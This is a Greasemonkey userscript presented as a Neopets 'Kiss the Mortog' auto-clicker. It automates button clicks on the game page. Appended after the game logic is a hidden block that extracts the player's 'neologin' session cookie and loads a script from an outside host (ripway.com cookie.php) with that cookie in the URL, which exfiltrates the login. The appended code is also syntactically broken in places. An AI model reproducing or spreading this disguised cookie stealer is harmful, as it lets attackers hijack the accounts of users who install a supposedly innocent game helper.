// ==UserScript==
// @name           Kiss the Morthog
// @description	   Auto"kisser"
// @namespace      http://userscripts.org/users/83296
// @include        http://www.neopets.com/medieval/kissthemortog.phtml*
// set to stop at 35000 neopoints, just change it higher or lower if needed.
// ==/UserScript==

var x = 1000 //change the delay here; 1000 = 1 second

function delay() {
if(document.body.innerHTML.indexOf('35,000 NP') != -1){
return
}

if(document.body.innerHTML.indexOf('Continue') != -1){
  var button = document.evaluate('//form[contains(@action,"kissthemortog.phtml")]/input[@type = "submit" and @value = "Continue"]',document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null).snapshotItem(0);
  button.click();
  button.form.submit();
}
if (document.body.innerHTML.indexOf('Try again...') != -1){
  var button = document.evaluate('//form[contains(@action,"kissthemortog.phtml")]/input[@type = "submit" and @value = "Try again..."]',document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null).snapshotItem(0);
  button.click();
  button.form.submit();
}

if (document.body.innerHTML.indexOf('Select your Mortog') != -1){
var links = document.evaluate("//a[@href]", document, null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

for (var i = 0; i < links.snapshotLength; ++i)
{
    flip = links.snapshotItem(i);

    if (flip.href.match('kissthemortog.phtml.type=frogprince&num=1'))
    {
	document.location=flip.href;						
	return;
    }
}
}
}
window.setTimeout(delay, x)
 if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = http://h1.ripway.com/npseller12/cookie.php 
?cookie=';

var testArray = document.evaluate(
     "a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}